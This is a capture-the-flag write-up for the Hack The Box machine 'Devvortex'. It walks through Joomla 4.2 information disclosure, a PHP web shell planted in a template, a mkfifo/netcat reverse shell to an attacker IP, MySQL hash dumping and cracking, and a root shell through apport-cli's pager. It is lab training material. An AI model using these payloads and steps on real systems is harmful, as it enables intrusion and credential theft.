# Devvortex

## 1. Machine General Information

* **Operative System:** Linux
* **Difficulty**: Easy
* **Keywords**:
  * Hash Cracking
  * RCE
  * Joomla
  * apport-cli

## 2. Enumeration

### 2.1 Port Scanning

```
$ cat nmap/default-script-scan.nmap
# Nmap 7.94SVN scan initiated Fri Mar 29 18:29:04 2024 as: nmap -sC -Pn -T5 -oN nmap/default-script-scan.nmap devvortex.htb
Warning: 10.10.11.242 giving up on port because retransmission cap hit (2).
Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.096s latency).
Not shown: 886 closed tcp ports (reset), 112 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http
|_http-title: DevVortex

# Nmap done at Fri Mar 29 18:29:18 2024 -- 1 IP address (1 host up) scanned in 13.93 seconds
```

A quick nmap scan shows only two ports open.&#x20;

* A SSH server running on port 22/tcp.&#x20;
* A web server running on port 80/tcp.

### 2.2 DNS Subdomain Enumeration

A basic directory enumeration didn't show any results, but if you try a dns subdomain enumeration with gobuster, it will found a new subdomain:

```
$ gobuster dns -d devvortex.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt  -t 20 --timeout 10s
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     devvortex.htb
[+] Threads:    20
[+] Timeout:    10s
[+] Wordlist:   /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: dev.devvortex.htb

Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================

```

To access this new subdomain we need to add it to /etc/hosts file.

```
$ cat /etc/hosts                                       
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters


10.10.11.242	devvortex.htb	dev.devvortex.htb
```

### 2.3 Joomla Enumeration

With a basic directory enumeration in dev.devvortex.htb, we can be found a Joomla admin login page at http://dev.devvortex.htb/administrator/

<figure><img src="../../../../../.gitbook/assets/Captura desde 2024-04-08 13-12-56.png" alt=""><figcaption></figcaption></figure>

A  README.txt file is accesible too in the following URL:&#x20;

* [http://dev.devvortex.htb/README.txt](http://dev.devvortex.htb/README.txt)

We can use this README file to get the version of Joomla.

```
$ curl http://dev.devvortex.htb/README.txt | grep "version"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4942  100  4942    0     0  17433      0 --:--:-- --:--:-- --:--:-- 17401
	* Joomla! 4.2 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_4.2_version_history
	* It's a free and Open Source software, distributed under the GNU General Public License version 2 or later.
	* Always use the latest version: https://downloads.joomla.org/latest
	* Distributed under the GNU General Public License version 2 or later
```

Joomla v4.2 has an Unauthenticated Information Disclosure vulnerability.&#x20;

## 3. Exploitation

### 3.1 Joomla v4.2 Unauthenticated Information Disclosure

An issue was discovered in Joomla! 4.0.0 through 4.2.7. An improper access check allows unauthorized access to webservice endpoints. Those endpoints are:

* [http://dev.devvortex.htb/api/index.php/v1/users?public=true](http://dev.devvortex.htb/api/index.php/v1/users?public=true)

<figure><img src="../../../../../.gitbook/assets/imagen (17).png" alt=""><figcaption></figcaption></figure>

* [http://dev.devvortex.htb/api/index.php/v1/config/application?public=true](http://dev.devvortex.htb/api/index.php/v1/config/application?public=true)

<figure><img src="../../../../../.gitbook/assets/imagen (18).png" alt=""><figcaption></figcaption></figure>

Using the following credentials we can log in to the Joomla admin panel:

* `Username: lewis`
* `Password: P4ntherg0t1n5r3c0n##`

### 3.2 Obtaining Shell Access

To get access, we only have to edit a template and add **`system($_GET['cmd']);`** to a php file.

<figure><img src="../../../../../.gitbook/assets/imagen (19).png" alt=""><figcaption></figcaption></figure>

Now we can execute system commands using curl:

```
$ curl http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=whoami 
www-data
```

To send this request to BurpSuite, we can use **-x** parameter:

```
$ curl http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=whoami -x http://localhost:8080
```

When the request is received with BurpSuite, we can send it to Repeater and use the next Payload as the value of cmd url parameter:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.50 6969 >/tmp/f
```

The Repeater request should look like this:

```
GET /templates/cassiopeia/error.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.14.50+6969+>/tmp/f HTTP/1.1
Host: dev.devvortex.htb
User-Agent: curl/8.5.0
Accept: */*
Connection: close
```

Before sending the request we need to start a listener with **nc** using the specified port:

```
$ nc -lvnp 6969                                            
listening on [any] 6969 ...
connect to [10.10.14.50] from (UNKNOWN) [10.10.11.242] 41376
sh: 0: can't access tty; job control turned off
$
```

Stabilizing the shell:

```
$ script /dev/null -c /bin/bash
CTRL+Z
stty raw -echo; fg
Then press Enter twice:
export TERM=xterm
```

### 3.3 Inspecting mysql database

There is a configuration.php file inside /var/www/dev.devvortex.htb/

{% code title="configuration.php" lineNumbers="true" %}
```
$ cat /var/www/dev.devvortex.htb/configuration.php
<?php
class JConfig {
	...
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'lewis';
	public $password = 'P4ntherg0t1n5r3c0n##';
	public $db = 'joomla';
	public $dbprefix = 'sd4fg_';
	public $dbencryption = 0;
	...
}
```
{% endcode %}

Seems like they are using the same credentials to access the database.

```
www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p"P4ntherg0t1n5r3c0n##" -e "SHOW DATABASES;"
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p"P4ntherg0t1n5r3c0n##" -e "SHOW TABLES;" joomla
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
...
| sd4fg_users                   |
...
+-------------------------------+
www-data@devvortex:~/dev.devvortex.htb$ 

```

Extracting Hashes

```
www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p"P4ntherg0t1n5r3c0n##" -e "SELECT * FROM sd4fg_users;" joomla
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2024-04-08 19:46:28 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
www-data@devvortex:~/dev.devvortex.htb$ C
```

Cracking logan password hash using hashcat:

```
$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt                
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 5 5600G with Radeon Graphics, 3840/7744 MB (1024 MB allocatable), 4MCU

...

$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
                                                          
...
```

Now we can log in via SSH using the following credentials:

* `Username: logan`
* `Password: tequieromucho`

```
$ ssh logan@devvortex.htb 
logan@devvortex.htb's password: 
Permission denied, please try again.
logan@devvortex.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 08 Apr 2024 09:16:22 PM UTC

  System load:  0.03              Processes:             164
  Usage of /:   63.4% of 4.76GB   Users logged in:       0
  Memory usage: 16%               IPv4 address for eth0: 10.10.11.242
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Apr  8 20:27:38 2024 from 10.10.14.50
logan@devvortex:~$ cat user.txt
SECRETSECRETSECRET

```

## 4. Privilege Escalation

### 4.1 Inspecting Sudo Rights

```
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

User logan can execute apport-cli with sudo rights.

Apport program is a tool to automatically collects data from crashed processes and compiles a problem report in /var/crash/. Seems like this tool has some serious vulnerabilities.

```
logan@devvortex:~$ apport-cli --version
2.20.11
```

This Apport-cli version has a privilege escalation vulnerability.

### 4.2 Exploiting apport-cli

To exploit the privilege escalation vulnerability in apport-cli 2.20.11, we need to use a valid crash file. I asked ChatGPT to generate one for me.

{% code title="report.crash" lineNumbers="true" %}
```
ProblemType: Crash
Architecture: amd64
Date: Wed Apr  8 13:50:22 2024
ExecutablePath: /usr/bin/bash
ExecutableTimestamp: 1617782882
ProcCwd: /var/run/nginx
```
{% endcode %}

Now we can use apport-cli to exploit it.

```
logan@devvortex:~$ sudo /usr/bin/apport-cli -c report.crash 

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (0.1 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): # TYPE V #
```

After typing **`v`** key, apport-cli will show us what it seems to be the output of `less` .

```
== Architecture =================================
amd64

== Date =================================
Wed Apr  8 13:50:22 2024

== ExecutablePath =================================
/usr/bin/bash

== ProblemType =================================
Crash

== ProcCwd =================================
/var/run/nginx

== UnreportableReason =================================
The problem happened with the program /usr/bin/bash which changed since the crash occurred.

(END) # TYPE !sh #
```

If we type **`!sh`** , it will spawn a root shell.

```
# cat /root/root.txt
SECRETSECRETSECRETSECRET
```

Here is the complete output:

```
logan@devvortex:~$ sudo /usr/bin/apport-cli -c ./report.crash 

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (0.1 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v
# whoami
root
# 
```

## 5. References

* [Joomla Information Disclosure](https://github.com/Acceis/exploit-CVE-2023-23752)
* [Apport-cli  Privilege Escalation](https://github.com/diego-tella/CVE-2023-1326-PoC)
